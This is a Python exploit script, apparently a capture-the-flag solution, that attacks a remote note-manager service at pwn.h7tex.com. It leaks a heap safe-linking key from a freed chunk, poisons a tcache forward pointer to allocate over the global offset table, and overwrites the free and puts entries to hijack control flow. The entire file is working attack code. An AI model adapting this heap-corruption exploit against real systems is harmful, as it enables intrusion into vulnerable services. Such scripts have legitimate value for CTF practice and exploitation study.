import socket
import time
import struct

def p64(x):
    return struct.pack('<Q', x)

def u64(x):
    return struct.unpack('<Q', x)[0]

HOST = 'pwn.h7tex.com'
PORT = 42300

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((HOST, PORT))

def recv_until(sock, delim):
    buf = b''
    while delim not in buf:
        chunk = sock.recv(1)
        if not chunk:
            break
        buf += chunk
    return buf

def add(idx, data):
    recv_until(s, b'> ')
    s.sendall(b'1\n')
    recv_until(s, b'index: ')
    s.sendall(f'{idx}\n'.encode())
    recv_until(s, b'note: ')
    s.sendall(data)
    time.sleep(0.05)

def delete(idx):
    recv_until(s, b'> ')
    s.sendall(b'2\n')
    recv_until(s, b'index: ')
    s.sendall(f'{idx}\n'.encode())
    time.sleep(0.05)

def edit(idx, data):
    recv_until(s, b'> ')
    s.sendall(b'3\n')
    recv_until(s, b'index: ')
    s.sendall(f'{idx}\n'.encode())
    recv_until(s, b'note: ')
    s.sendall(data)
    time.sleep(0.05)

def view(idx):
    recv_until(s, b'> ')
    s.sendall(b'4\n')
    recv_until(s, b'index: ')
    s.sendall(f'{idx}\n'.encode())
    data = b''
    while len(data) < 0x50:
        chunk = s.recv(0x50 - len(data))
        if not chunk:
            break
        data += chunk
    return data

print("[*] Connected to target!")

# Step 1: Allocate two chunks
print("[*] Allocating chunk 0 and 1...")
add(0, b'A' * 0x50)
add(1, b'B' * 0x50)

# Step 2: Free chunk 0, then chunk 1
print("[*] Freeing chunk 0 then 1...")
delete(0)
delete(1)

# Step 3: Leak heap key from chunk 0
leak0 = view(0)
heap_key = u64(leak0[:8])
print(f"[+] Leaked heap key (chunk0 >> 12): 0x{heap_key:x}")

# Step 4: Poison chunk 1's fd to target 0x404000 (free@GOT / puts@GOT)
TARGET = 0x404000
AUDIT = 0x4012b6

mangled_target = TARGET ^ heap_key
print(f"[*] Poisoning chunk 1 fd with mangled target: 0x{mangled_target:x}")
edit(1, p64(mangled_target) + b'\x00' * 0x48)

# Step 5: Allocate chunk 1 back from tcache
print("[*] Allocating chunk 2 (gets chunk 1 from tcache)...")
add(2, b'C' * 0x50)

# Step 6: Allocate chunk 3 (gets TARGET 0x404000 from tcache) and overwrite GOT
print("[*] Allocating chunk 3 (at 0x404000) and overwriting puts@GOT with audit (0x4012b6)...")
# 0x404000: free@GOT
# 0x404008: puts@GOT
payload = p64(AUDIT) + p64(AUDIT)
add(3, payload)

print("[*] Reading output (audit should be triggered when menu calls puts)...")
resp = b''
s.settimeout(3)
try:
    while True:
        chunk = s.recv(1024)
        if not chunk:
            break
        resp += chunk
except Exception:
    pass

print("[+] Output received:")
print(resp.decode(errors='replace'))
s.close()
